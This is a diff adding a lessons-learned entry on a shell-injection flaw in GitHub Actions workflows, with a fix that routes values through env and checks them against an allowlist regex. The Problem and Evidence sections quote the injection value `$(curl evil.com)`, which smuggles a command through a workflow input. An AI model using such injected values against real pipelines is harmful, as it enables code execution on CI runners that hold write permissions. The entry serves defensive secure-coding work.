@@ -1524,6 +1524,26 @@ claim_area: linter-design
 
 **Disposition:** `check-text-encoding` is now part of the standard 13-linter aggregator and runs by default. Future projects bootstrapped via `harness init` will inherit the same enforcement. The linter is also referenced in the canonical sub-agent briefing preamble (CS11 LRN-068 follow-up) as the standard self-check command — replaces the previous PowerShell BOM-check snippet.
 
+### LRN-075
+
+```yaml
+id: LRN-075
+date: 2026-05-04
+category: tooling
+source_cs: CS12
+status: applied
+tags: [github-actions, shell-injection, workflow-security, env-vars, allowlist-validation, ci-supply-chain]
+claim_area: workflow-design
+```
+
+**Problem:** CS12 added two GitHub Actions workflow files (`harness-checks.yml` reusable + `harness-drift.yml` template). Initial implementation interpolated GitHub expressions (workflow input `cli-ref`, derived ref from `harness.config.json`, `${{ github.repository }}`, `${{ github.sha }}`) directly into `run:` shell scripts. PR #48 R1 review flagged this as a shell-injection vulnerability: a malicious or malformed ref like `$(curl evil.com)` would be expanded by bash even inside double quotes. The drift workflow has `contents: write` + `pull-requests: write` permissions, so blast radius was substantial — a malicious config could trigger arbitrary code execution with PR-creation rights.
+
+**Finding:** GitHub Actions workflows that consume any externally-influenced data (workflow inputs, file contents, expression outputs) into `run:` shell bodies must (a) **never interpolate GitHub expressions directly** into the script body — pass them through `env:` instead so bash only sees the value as an environment variable; AND (b) **validate the value against an allowlist regex** before any shell consumption. The allowlist for "git refs" is conservative: `^[a-zA-Z0-9._/-]+$` covers semver tags, branch names, and 40-char SHAs while rejecting all shell metacharacters. Combination of env-passing + allowlist-validation is the defence-in-depth pattern.
+
+**Evidence:** CS12 PR #48 R1 review reproduced the threat: any caller could pass `cli-ref: $(curl evil.com)` to the reusable workflow; with the original implementation, that would execute as shell on the runner. R1 fix in commit `9dcb258`: passes `inputs.cli-ref` and `steps.derive-ref.outputs.ref` through `env:` (CLI_REF, GH_REPO, GH_SHA), validates the derived ref via `printf '%s' "$ref" | grep -Eq '^[a-zA-Z0-9._/-]+$'`, exits with a clear error pointing to the CS12 R1 PR review on rejection. Reusable workflow also gained explicit `permissions: contents: read` (least privilege). 3 new regression tests in `tests/cs12-workflows.test.mjs` (17 total) assert the env-pass + allowlist pattern is present in both workflows; a future bypass attempt at code-review time would fail tests.
+
+**Disposition:** Convention to apply to every future GitHub Actions workflow in this repo and in template/managed/.github/workflows/: any GitHub expression consumed by `run:` MUST go through `env:`, NEVER directly interpolated; any externally-influenced value going to shell MUST be validated against an allowlist regex. Document as a CONVENTIONS.md entry (or extend `check-workflow-pins.mjs` to mechanically detect direct-expression-in-run patterns at lint time — file as a follow-up CS if/when needed).
+
 ## Obsolete
 
 (none yet)
